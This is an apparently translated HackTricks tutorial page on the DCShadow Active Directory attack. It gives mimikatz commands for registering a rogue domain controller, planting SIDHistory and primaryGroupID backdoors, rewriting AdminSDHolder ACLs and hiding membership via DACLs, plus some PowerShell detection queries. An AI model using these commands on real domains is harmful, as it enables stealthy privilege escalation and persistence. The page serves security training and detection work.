# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Osnovne informacije

Registruje **novi Domain Controller** u AD i koristi ga da **push attributes** (SIDHistory, SPNs...) na određenim objektima **without** leaving any **logs** regarding the **modifications**. Potrebne su ti **DA** privilegije i moraš biti unutar **root domain**.\
Imaj na umu da će, ako koristiš pogrešne podatke, pojaviti prilično ružni **logs**.

Za izvođenje napada potrebna su ti 2 **mimikatz** instance. Jedna od njih će pokrenuti **RPC servers** sa **SYSTEM** privilegijama (ovde moraš navesti izmene koje želiš da izvršiš), a druga instanca će se koristiti da **push the values**:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Obratite pažnju da **`elevate::token`** neće raditi u `mimikatz1` sesiji jer je to uzdiglo privilegije threada, ali treba da uzdigujemo **privilegiju procesa**.\
Takođe možete izabrati i "LDAP" object: /object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local

Možete primeniti izmene sa DA ili sa korisnika koji ima ova minimalna ovlašćenja:

- U **objektu domena**:
- _DS-Install-Replica_ (dodavanje/uklanjanje replike u domenu)
- _DS-Replication-Manage-Topology_ (upravljanje replikacionom topologijom)
- _DS-Replication-Synchronize_ (sinhronizacija replikacije)
- Objekat **Sites** (i njegovi potomci) u **Configuration** kontejneru:
- _CreateChild and DeleteChild_
- Objekat **računara koji je registrovan kao DC**:
- _WriteProperty_ (Not Write)
- **Ciljni objekat**:
- _WriteProperty_ (Not Write)

Možete koristiti [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) da dodelite ove privilegije neprivilegovanom korisniku (imajte na umu da će ovo ostaviti neke logove). Ovo je znatno restriktivnije nego imati DA privilegije.\
Na primer: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Ovo znači da korisničko ime _**student1**_ kada je prijavljeno na mašinu _**mcorp-student1**_ ima DCShadow dozvole nad objektom _**root1user**_.

## Korišćenje DCShadow za kreiranje backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Zloupotreba primarne grupe, praznine u enumeraciji i detekcija

- `primaryGroupID` je zaseban atribut u odnosu na listu `member` grupe. DCShadow/DSInternals mogu ga direktno upisati (npr. postaviti `primaryGroupID=512` za **Domain Admins**) bez on-box LSASS enforcement, ali AD i dalje **premesti** korisnika: promena PGID uvek uklanja članstvo iz prethodne primarne grupe (isto ponašanje važi za bilo koju ciljnu grupu), tako da ne možete zadržati staro članstvo primarne grupe.
- Podrazumevani alati onemogućavaju uklanjanje korisnika iz njihove trenutne primarne grupe (`ADUC`, `Remove-ADGroupMember`), pa promena PGID obično zahteva direktne upise u direktorijum (DCShadow/`Set-ADDBPrimaryGroup`).
- Izveštavanje o članstvu nije konzistentno:
- **Uključuje** članove izvedene iz primarne grupe: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Izostavlja** članove izvedene iz primarne grupe: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inspecting `member`, `Get-ADUser <user> -Properties memberOf`.
- Rekurzivne provere mogu propustiti članove primarne grupe ako je **primarna grupa sama ugnježdena** (npr. PGID korisnika ukazuje na ugnježdenu grupu unutar Domain Admins); `Get-ADGroupMember -Recursive` ili LDAP rekurzivni filtri neće vratiti tog korisnika osim ako rekurzija eksplicitno ne razreši primarne grupe.
- DACL trikovi: napadači mogu **deny ReadProperty** na `primaryGroupID` kod korisnika (ili na atributu `member` grupe za ne-AdminSDHolder grupe), skrivajući efektivno članstvo od većine PowerShell upita; `net group` će i dalje razrešiti članstvo. Grupe zaštićene AdminSDHolder će resetovati takva deny pravila.

Detection/monitoring examples:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Cross-check privileged groups by comparing `Get-ADGroupMember` output with `Get-ADGroup -Properties member` or ADSI Edit to catch discrepancies introduced by `primaryGroupID` or hidden attributes.

## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)

Potrebno je dodati sledeće ACE-e sa SID-om našeg korisnika na kraju:

- Na objektu domena:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Na objektu računara napadača: `(A;;WP;;;UserSID)`
- Na objektu ciljanog korisnika: `(A;;WP;;;UserSID)`
- Na Sites objektu u Configuration kontejneru: `(A;CI;CCDC;;;UserSID)`

Da biste dobili trenutni ACE nekog objekta: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Obratite pažnju da u ovom slučaju morate napraviti **više izmena**, ne samo jednu. Dakle, u **mimikatz1 session** (RPC server) koristite parametar **`/stack` sa svakom izmenom** koju želite da izvršite. Na ovaj način biće vam potrebno samo da jednom izvršite **`/push`** da biste primenili sve nagomilane izmene na rogue serveru.

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## References

- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
